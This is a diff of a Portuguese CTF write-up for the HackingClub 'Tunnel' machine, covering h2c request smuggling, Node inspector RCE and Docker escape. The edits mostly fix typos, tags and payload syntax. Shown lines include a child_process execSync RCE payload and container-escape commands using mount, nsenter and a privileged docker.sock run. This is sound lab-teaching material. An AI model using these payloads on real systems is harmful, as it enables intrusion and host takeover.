@@ -2,8 +2,8 @@
 title: Tunnel - Desafio Hacker [HackingClub]
 description: 'Resolvendo máquina nível médio da Hacking Club sobre h2c request smuggling, RCE e Docker escape'
 author: matheus
-tags: ["HackingClub", "WriteUps", "RCE", "request smuggling", "docker escape", "video"]
-categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
+tags: ["HackingClub", "WriteUps", "request smuggling", "h2c", "RCE", "Spring Boot Actuator", "docker escape", "Node.js", "video"]
+categories: ["Segurança", "CTF e Writeups"]
 pin: false
 comments: true
 
@@ -12,11 +12,11 @@ image:
   alt: "Tunnel (Hacking Club) — h2c request smuggling, RCE e Docker escape"
 ---
 
-# Writeup: Tunnel (HackingClub Machine)
+## Writeup: Tunnel (HackingClub Machine)
 
 ### HTTP/2 Cleartext Tunnel (h2c), Nginx Bypass, Node Inspector RCE e Docker Escape
 
-Eu fiz esse desafio em meu ambiente de trabalho com Windows 11 via WSL. Utilizei tanto o terminal do windows - com meu kali sem interface gráfica -, como também aproveitei o WSL2 que me permite executar o Kali Linux com interface gráfica utilizando a tecnologia de virtualização Hyper-V. Em outras palavras, tudo foi realizado dentro de um ambiente já configurado e com ferramentas complementares instaladas. Se faz necessário já ter conhecimento prévio em determinadas coisas como Linux/Bash, Redes - como protocolo HTTP -, Fuzzing, Docker, JAVA e JavaScript para resolver esta máquina.
+Eu fiz esse desafio em meu ambiente de trabalho com Windows 11 via WSL. Utilizei tanto o terminal do windows - com meu Kali sem interface gráfica -, como também aproveitei o WSL2 que me permite executar o Kali Linux com interface gráfica utilizando a tecnologia de virtualização Hyper-V. Em outras palavras, tudo foi realizado dentro de um ambiente já configurado e com ferramentas complementares instaladas. Se faz necessário já ter conhecimento prévio em determinadas coisas como Linux/Bash, Redes - como protocolo HTTP -, Fuzzing, Docker, JAVA e JavaScript para resolver esta máquina.
 
 ## 1. Enumeração Inicial e Fuzzing
 
@@ -90,7 +90,7 @@ A descrição da máquina menciona **"HTTP/2 tunneling"**, indicando vulnerabili
 
 ### 4.1 Conceitos fundamentais
 
-**HTTP/2 Cleartext (h2c)** é uma extensão do protocolo HTTP/2 que permite comunicação sem TLS/SSL, utilizando o mecanismo de upgrade HTTP/1.1 definido na **RFC 7540**.
+**HTTP/2 Cleartext (h2c)** é uma extensão do protocolo HTTP/2 que permite comunicação sem TLS/SSL, utilizando o upgrade de HTTP/1.1 (**RFC 7230**) usado para negociar o h2c (**RFC 7540**).
 
 **Request Smuggling** é uma técnica que explora diferenças na interpretação de requisições HTTP entre proxies/load balancers e servidores backend, permitindo bypass de controles de segurança.
 
@@ -410,7 +410,7 @@ JSON contendo informações da sessão de debugging:
   "id": "7efa5220-45c7-44c2-b367-d9068de778bd",
   "title": "/app/server.js",
   "type": "node",
-  "url": "file://app/server.js",  
+  "url": "file:///app/server.js",
   "webSocketDebuggerUrl": "ws://172.16.3.113/7efa5220-45c7-44c2-b367-d9068de778bd"
 }
 ```
@@ -536,7 +536,7 @@ process.mainModule.require('child_process')
 
 **Resumindo payload:**
 
-Ao chamarmos o processo/módulo principal `process.mainModule` teremos acesso ao módulo `require` e então incluir `child process` - a biblioteca do JS para execução de comando -, para assim chamar o método `exec` e, obviamente, executar o comando que queremos.
+Ao chamarmos o processo/módulo principal `process.mainModule` teremos acesso ao módulo `require` e então incluir `child_process` - a biblioteca do JS para execução de comando -, para assim chamar o método `exec` e, obviamente, executar o comando que queremos.
 
 ```javascript
 process.mainModule.require('child_process').exec('COMANDO_DESEJADO')
@@ -559,13 +559,13 @@ A execução não pode quebrar o JSON e, portanto, precisamos colocar o comando 
 //
 // O comando que queremos executar inicialmente para identificação: id
 //
-// Modernizando
-//  * process.require('child_process').exec("id");
+// Modernizando (require global não está acessível aqui; o certo é process.mainModule.require)
+//  * process.mainModule.require('child_process').exec("id");
 // Adaptando
-//  * process.require('child_process').execSync(\"id\").toString();
+//  * process.mainModule.require('child_process').execSync(\"id\").toString();
 //
 // Payload:
-// process.require('child_process').execSync(\"id\").toString();
+// process.mainModule.require('child_process').execSync(\"id\").toString();
 // É necessário mainModule
 process.mainModule.require('child_process').execSync(\"id\").toString();
 ```
@@ -574,7 +574,7 @@ process.mainModule.require('child_process').execSync(\"id\").toString();
 
 → Podemos adicionar o toString para colocar o output do comando em string;
 
-→ Precisaremos evitar que o JSON não quebre escapando aspas *(\ " \ ")*;
+→ Precisaremos evitar que o JSON quebre escapando aspas *(\ " \ ")*;
 
 **Payload completa:**
 
@@ -831,7 +831,7 @@ Sem a ferramenta `capsh`, testamos capabilities indiretamente:
 **Análise de partições:**
 
 ```bash
-disk -l # se disponível (não terá no container)
+fdisk -l # se disponível (não terá no container)
 df -h # estará disponível e mostrará para você as partições que poderão talvez ser montados
 lsblk # se disponível
 ```
@@ -864,7 +864,7 @@ mount /dev/nvme0n1p1 /mnt
 ✅ `/mnt` agora contém o **filesystem completo do host**  
 ✅ `/mnt/root` = diretório `/root` do sistema hospedeiro
 
-**PRONTO!!** Agora é só dar "`cat root.txt`" e ver a última flag que precisamos, mas ainda não estamos satisfeito. Faremos isso de outra forma, vamos estipular desafios. Só poderemos visualizar tal arquivo se estivermos conectados como root da máquina host principal e não apenas acessando a partição dessa máquina montada. Para isso, nós iremos nos conectar diretamente via conexão SSH.
+**PRONTO!!** Agora é só dar "`cat root.txt`" e ver a última flag que precisamos, mas ainda não estamos satisfeitos. Faremos isso de outra forma, vamos estipular desafios. Só poderemos visualizar tal arquivo se estivermos conectados como root da máquina host principal e não apenas acessando a partição dessa máquina montada. Para isso, nós iremos nos conectar diretamente via conexão SSH.
 
 ### 13.2 Outras técnicas de escape (se mount falhasse)
 
@@ -879,7 +879,7 @@ nsenter -t 1 -m -p /bin/bash
 **Socket do Docker exposto:**
 Alguns containers têm acesso ao socket do Docker montado. Isso permite criar novos containers com acesso total ao host:
 ```bash
-docker -H unix://var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i bash
 ```
 
 **Escrita em devices de bloco:**
@@ -1081,7 +1081,7 @@ ls
 cat nginx.conf
 
 ```
-```conf
+```nginx
 server {
     listen       80 default_server;
     server_name  localhost;
@@ -1226,7 +1226,7 @@ Assim o h2c bypass não teria conseguido acessar nada crítico.
 
 #### 3. Node.js Debug - RCE direto
 
-Descobrimos no docker-compose que o Node estava rodando com `--inspect=0.0.0.0:8000`, expondo o debugging para qualquer IP. Isso é suicide em produção.
+Descobrimos no docker-compose que o Node estava rodando com `--inspect=0.0.0.0:8000`, expondo o debugging para qualquer IP. Isso é suicídio em produção.
 
 - Se necessário, bind em localhost: `--inspect=127.0.0.1:9229`
 
@@ -1315,7 +1315,7 @@ Mas como todas estavam presentes, criaram um caminho direto para comprometimento
 
 <img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />
 
-**Nota: Mantive apenas visivel em foto uma flag (primeira) para te fazer praticar. Em vídeo temos resolução do exercício com as flags, mas ainda é preferível que faça você mesmo, nunca esquecer. Assistir é algo passivo, em hacking só aprendemos mesmo quanto somos ativo.**
+**Nota: Mantive apenas visivel em foto uma flag (primeira) para te fazer praticar. Em vídeo temos resolução do exercício com as flags, mas ainda é preferível que faça você mesmo, nunca esquecer. Assistir é algo passivo, em hacking só aprendemos mesmo quando somos ativos.**
 
 #### Áudio Visual: Resolução gravada em vídeo
 
